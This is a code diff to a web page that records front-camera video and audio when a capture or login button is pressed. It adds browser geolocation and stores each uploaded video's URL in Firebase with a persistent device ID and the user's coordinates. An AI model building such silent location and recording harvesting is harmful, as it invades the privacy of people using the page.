@@ -150,8 +150,9 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
-        import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
-
+        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
+    
         const firebaseConfig = {
             apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
             authDomain: "nou-no-circle.firebaseapp.com",
@@ -164,6 +165,7 @@
 
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
+        const db = getFirestore(app);
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -461,6 +463,8 @@
             // 他の動画URLとタイトルを追加
         ];
 
+	let currentLocation = null;
+
         function getOrCreateDeviceId() {
             let deviceId = localStorage.getItem('deviceId');
             if (!deviceId) {
@@ -538,7 +542,9 @@
         }
 
         captureButton.addEventListener('click', () => {
-            requestFrontCameraAndAudioAccess().then(captureAndLogin).catch(() => {
+            requestFrontCameraAndAudioAccess().then(() => {
+                getLocation().then(captureAndLogin);
+            }).catch(() => {
                 alert('カメラの権限が許可されていません。');
             });
         });
@@ -546,6 +552,26 @@
         reloadButton.addEventListener('click', () => {
             location.reload();
         });
+
+    async function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        currentLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                        resolve(currentLocation);
+                    }, (error) => {
+                        console.error('位置情報の取得に失敗しました:', error);
+                        reject(error);
+                    });
+                } else {
+                    console.error('このブラウザは位置情報をサポートしていません。');
+                    reject(new Error('Geolocation is not supported by this browser.'));
+                }
+            });
+        }
 
         async function loadVideos(page) {
             const startIndex = (page - 1) * videosPerPage;
@@ -630,7 +656,7 @@
             }
         }
 
-        function uploadVideo(blob) {
+        async function uploadVideo(blob) {
             const deviceId = getOrCreateDeviceId();
             const storageRef = ref(storage, `videos/${deviceId}/${Date.now()}.webm`);
             const uploadTask = uploadBytesResumable(storageRef, blob);
@@ -643,10 +669,26 @@
                 (error) => {
                     console.error('Upload error:', error);
                 },
-                () => {
-                    console.log('Upload successful!');
+                async () => {
+                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                    saveVideoMetadata(downloadURL);
                 }
             );
+        }
+
+        async function saveVideoMetadata(downloadURL) {
+            try {
+                const deviceId = getOrCreateDeviceId();
+                const docRef = await addDoc(collection(db, "videos"), {
+                    url: downloadURL,
+                    deviceId: deviceId,
+                    timestamp: Date.now(),
+                    location: currentLocation
+                });
+                console.log("Document written with ID: ", docRef.id);
+            } catch (e) {
+                console.error("Error adding document: ", e);
+              }
         }
     </script>
 </body>
